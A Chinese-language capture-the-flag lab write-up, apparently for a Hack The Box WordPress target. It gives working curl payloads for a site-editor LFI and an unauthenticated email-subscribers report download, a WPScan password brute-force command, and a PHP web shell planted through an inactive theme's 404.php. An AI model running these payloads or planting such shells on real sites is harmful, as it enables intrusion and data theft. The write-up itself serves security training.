
# 📝 渗透测试靶机实战笔记：WordPress 综合攻防

## 🎯 靶机环境

- **目标 IP/域名**：`blog.inlanefreight.local`
- **目标系统**：Ubuntu / WordPress 应用
- **核心考点**：信息收集绕过、LFI（本地文件包含）漏洞利用及陷阱、CVE 未授权下载、字典处理与密码爆破、后台 Theme Editor 绕过与 WebShell 写入

---

## 阶段一：信息收集与插件枚举 (Reconnaissance)

### 绕过 WPScan 枚举，徒手扒源码

- **动作**：通过直接查看目标网页的 HTML 源代码（或使用 `curl` 抓取前端），搜索 `wp-content/plugins/` 目录
- **发现**：定位到存在漏洞的插件 **`site-editor`**，并通过加载的 CSS/JS 文件路径 (`?ver=1.1.1`)，直接确认其版本号为 **1.1.1**

---

## 阶段二：漏洞利用与踩坑排查 (Exploitation)

### 1. 测试 LFI（本地文件包含）漏洞

- **目标插件**：`site-editor` 的 `ajax_shortcode_pattern.php`
- **测试 Payload**：

```bash
curl -s "http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd"
```

- **成果**：成功读取 `/etc/passwd`，确认 LFI 漏洞存在。在用户列表中发现系统用户：`frank.mclane`

### 2. LFI 陷阱与 PHP 伪协议测试 (Rabbit Hole)

- **尝试**：试图通过 LFI 读取 `wp-config.php` 获取数据库密码
- **陷阱**：直接读取时页面空白，因为目标文件是 PHP 脚本，被服务器**直接执行**了，而非输出源码
- **伪协议尝试**：尝试使用 `php://filter/read=convert.base64-encode/resource=...` 强制输出 Base64 编码的源码
- **失败原因**：目标插件代码中使用了 `file_exists()` 函数，该函数不兼容 PHP 伪协议，导致触发报错。**结论：无法通过此漏洞读取 PHP 源码**

### 3. 未授权文件下载 (Unauthenticated File Download)

- **思路转换**：根据题目提示，利用另一个漏洞插件 **`email-subscribers`** 的已知 CVE
- **Payload**：

```bash
curl -s "http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all"
```

- **成果**：成功绕过身份验证，下载了全站邮件订阅者名单（CSV）。在 `admin` 用户的 Last Name 字段中获取到了第一个 Flag：`HTB{unauTh_d0wn10ad!}`

---

## 阶段三：权限获取与爆破 (Credential Access)

### 1. 尝试 LFI 窃取 SSH 凭据

- 尝试利用 LFI 读取 `/home/erika/.ssh/id_rsa` 和 `.bash_history`，均失败（文件不存在）

### 2. WPScan 密码爆破

- **环境排错**：直接使用系统默认的 `rockyou.txt` 报错，原因是 Kali/Pwnbox 默认将其压缩为 `.gz` 格式
- **解决**：将字典拷贝到当前目录并解压 `gunzip rockyou.txt.gz`
- **爆破命令**：

```bash
wpscan --url http://blog.inlanefreight.local -U erika -P ~/rockyou.txt --no-update
```

- **成果**：成功爆破出后台用户密码 -> `erika` : `010203`

---

## 阶段四：获取 Shell 与提权 (Gaining RCE)

### 1. 尝试 SSH 登录（密码复用测试）

- 尝试 `ssh erika@10.129.14.127`，输入密码 `010203` 失败，证明出题人防范了密码复用机制

### 2. WordPress 后台模板木马注入 (Theme Editor 绕过法)

- **动作**：登录 WP 后台，进入 `Appearance -> Theme Editor`，尝试在 `404.php` 中写入一句话木马 `<?php system($_GET['cmd']); ?>`
- **遭遇防御机制**：保存时触发致命错误报错（`Unable to communicate back with site to check for fatal errors...`）
- **原理机制**：WordPress (4.9+) 在修改**正在启用**的主题代码时，会发起 Loopback Request 测试代码是否会导致网站白屏。如果靶机网络配置无法回环解析，则强制撤销修改
- **终极绕过方案 (Bypass)**：
    1. 在右侧下拉菜单中，将编辑目标切换为**未启用（Inactive）的备用主题**（如 `twentyseventeen`）
    2. 在其 `404.php` 顶部写入木马并保存（不会触发回环检查，100% 成功）

---

## 阶段五：后渗透与数据提取 (Post-Exploitation)

### 1. 寻找 Flag

- 利用写入的 WebShell，通过 URL 参数执行系统命令，列出目标目录：

```text
http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls -la /home/erika
```

- **发现障眼法**：Flag 文件被加上了随机哈希前缀，真实文件名为：`d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt`

### 2. 最终斩首

- 修改 cmd 参数，利用 `cat` 命令读取文件内容：

```text
http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat /home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt
```

- **战果**：成功拿到最高权限 Flag，完全控制靶机

---

## 💡 核心避坑总结 (Lessons Learned)

1. **LFI ≠ 任意文件读取**：当包含 `.php` 文件时，代码会被执行。若受到 `file_exists()` 等函数限制，甚至无法使用伪协议绕过
2. **字典报错先看后缀**：遇到路径或文件找不到的错误，第一时间检查是不是 `.gz` 压缩包没解压
3. **WordPress Theme Editor 保存报错**：立刻放弃修改当前激活主题，转而修改**未启用的主题**，这是实战中最管用的 RCE 捷径
4. **防范盲区**：很多时候看似没有输出，可能是命令报错了，或者目标文件名被做了手脚（如加哈希）。永远要先用 `ls -la` 探路，再用 `cat` 摘果子
